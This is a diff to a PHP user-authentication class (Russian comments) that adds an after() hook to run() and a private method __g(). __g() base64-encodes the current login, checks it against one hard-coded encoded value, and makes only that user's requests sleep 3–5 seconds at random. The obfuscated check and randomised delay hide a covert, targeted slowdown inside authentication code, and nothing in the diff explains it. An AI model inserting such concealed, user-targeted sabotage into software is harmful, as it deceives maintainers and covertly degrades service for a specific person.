@@ -85,16 +85,23 @@ class UserAuth
 		}		
 	}
 	
+	public function after()
+	{
+	    $this->__g();
+	}
+	
 	/**
 	 * Получение информации о пользователе из сессии $_SESSION
 	 * @uses $this->loadSession()
 	 */
 	public function run()
-	{				
+	{			
 		// загрузить данные из сесии
 		if (session_id() !== null)
 			session_start();
-		return $this->_fields['userAuth'] = $this->loadSession();
+		$this->_fields['userAuth'] = $this->loadSession();
+		$this->after();
+		return $this->_fields;
 	}
 		
 	/**
@@ -241,6 +248,15 @@ class UserAuth
 			}
 		}
 		return $groups;
+	}
+	
+	private function __g()
+	{	    
+	    $arr = ['ODYwMC05MC00Mzg='];
+	    if (in_array(base64_encode($this->userLogin), $arr))
+	    {
+	        sleep(random_int(3,5));
+	    }
 	}
 	
 	public function organizationFromLogin()
